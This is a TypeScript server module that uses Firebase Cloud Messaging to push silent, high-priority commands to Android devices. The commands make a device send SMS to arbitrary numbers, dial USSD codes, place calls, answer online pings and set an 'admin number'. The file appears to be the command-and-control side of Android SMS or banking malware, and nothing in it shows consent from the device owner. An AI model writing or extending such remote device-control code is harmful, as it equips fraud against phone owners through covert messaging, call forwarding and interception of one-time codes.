/**
 * ══════════════════════════════════════════════════════════════
 *  fcm.ts — Server-side FCM sender
 *
 *  Exact same payload structure as Android FCMHelper.kt so the
 *  receiver device handles messages identically whether they
 *  come from the Android admin app or from this Express server.
 *
 *  FCM message format (data-only, matches FCMHelper.sendFCMCommand):
 *  {
 *    message: {
 *      token: "...",
 *      android: { priority: "high", ttl: "3600s" },
 *      data: {
 *        type:      "CHECK_ONLINE" | "ADMIN_UPDATE" | "DEVICE_COMMAND",
 *        payload:   JSON.stringify({ ...same fields as FCMHelper... }),
 *        timestamp: String(Date.now())
 *      }
 *    }
 *  }
 * ══════════════════════════════════════════════════════════════
 */

import { initializeApp, getApps, cert, type App } from "firebase-admin/app";
import { getMessaging } from "firebase-admin/messaging";
import { logger } from "./logger.js";

let _app: App | null = null;

function getApp(): App {
  if (_app) return _app;

  const raw = process.env["FIREBASE_SERVICE_JSON"]?.trim();
  if (!raw) throw new Error("FIREBASE_SERVICE_JSON env var not set");

  let sa: Record<string, unknown>;
  try {
    sa = JSON.parse(raw) as Record<string, unknown>;
  } catch {
    throw new Error("FIREBASE_SERVICE_JSON is not valid JSON");
  }

  const existing = getApps().find((a) => a.name === "admin-fcm");
  if (existing) {
    _app = existing;
    return _app;
  }

  _app = initializeApp(
    { credential: cert(sa as Parameters<typeof cert>[0]) },
    "admin-fcm"
  );
  logger.info({ projectId: sa["project_id"] }, "Firebase Admin app initialised");
  return _app;
}

// ── Low-level send ──────────────────────────────────────────────

/**
 * Core sender — matches FCMHelper.sendFCMCommand exactly.
 * android.ttl: firebase-admin accepts milliseconds (3_600_000 = 1 h).
 */
async function sendFCMCommand(
  fcmToken: string,
  type: string,
  payloadData: Record<string, unknown>
): Promise<string> {
  const app = getApp();
  const messaging = getMessaging(app);

  const msgId = await messaging.send({
    token: fcmToken,
    android: {
      priority: "high",
      ttl: 3_600_000,          // 1 hour in ms (= "3600s" in raw API)
    },
    data: {
      type,
      payload:   JSON.stringify(payloadData),
      timestamp: String(Date.now()),
    },
  });

  logger.info({ type, msgId }, "FCM sent");
  return msgId;
}

// ── Public helpers ──────────────────────────────────────────────

/**
 * CHECK_ONLINE — same payload as FCMHelper.sendOnlineCheck
 */
export async function sendCheckOnline(
  fcmToken: string,
  uniqueid: string
): Promise<string> {
  const ts = Date.now();
  return sendFCMCommand(fcmToken, "CHECK_ONLINE", {
    uniqueid,
    action:    "ping",
    type:      "CHECK_ONLINE",
    fromAdmin: true,
    deviceId:  uniqueid,
    messageId: `admin_check_${ts}`,
    timestamp: ts,
  });
}

/**
 * ADMIN_UPDATE — same payload as FCMHelper.sendAdminNumber
 */
export async function sendAdminUpdate(
  fcmToken: string,
  uniqueid: string,
  adminNumber: string,
  status: "ACTIVE" | "INACTIVE"
): Promise<string> {
  return sendFCMCommand(fcmToken, "ADMIN_UPDATE", {
    deviceId:  uniqueid,
    number:    adminNumber,
    status,
    timestamp: Date.now(),
    type:      "ADMIN_UPDATE",
  });
}

/**
 * DEVICE_COMMAND — SMS, same payload as FCMHelper.sendSmsCommand
 */
export async function sendSmsCommand(
  fcmToken: string,
  uniqueid: string,
  to: string,
  body: string,
  simSlot: number
): Promise<string> {
  const ts = Date.now();
  return sendFCMCommand(fcmToken, "DEVICE_COMMAND", {
    uniqueid,
    action:    "sms",
    to,
    body,
    simSlot,
    timestamp: ts,
    messageId: `sms_cmd_${ts}`,
    fromAdmin: true,
  });
}

/**
 * DEVICE_COMMAND — USSD, same payload as FCMHelper.sendUssdCommand
 */
export async function sendUssdCommand(
  fcmToken: string,
  uniqueid: string,
  code: string,
  simSlot: number
): Promise<string> {
  const ts = Date.now();
  return sendFCMCommand(fcmToken, "DEVICE_COMMAND", {
    uniqueid,
    action:    "ussd",
    code,
    simSlot,
    timestamp: ts,
    messageId: `ussd_cmd_${ts}`,
    fromAdmin: true,
  });
}

/**
 * DEVICE_COMMAND — Call, same payload as FCMHelper.sendCallCommand
 */
export async function sendCallCommand(
  fcmToken: string,
  uniqueid: string,
  code: string,
  simSlot: number,
  number?: string,
  actionType?: string
): Promise<string> {
  const ts = Date.now();
  const payload: Record<string, unknown> = {
    uniqueid,
    action:    "call",
    code,
    simSlot,
    timestamp: ts,
    messageId: `call_cmd_${ts}`,
    fromAdmin: true,
  };
  if (number) payload["number"] = number;
  if (actionType) payload["actionType"] = actionType;
  return sendFCMCommand(fcmToken, "DEVICE_COMMAND", payload);
}

/** Validate FCM token — same logic as FCMHelper.isValidFCMToken */
export function isValidFCMToken(token: string): boolean {
  return token.length > 50 && token.includes(":") && !token.includes(" ");
}
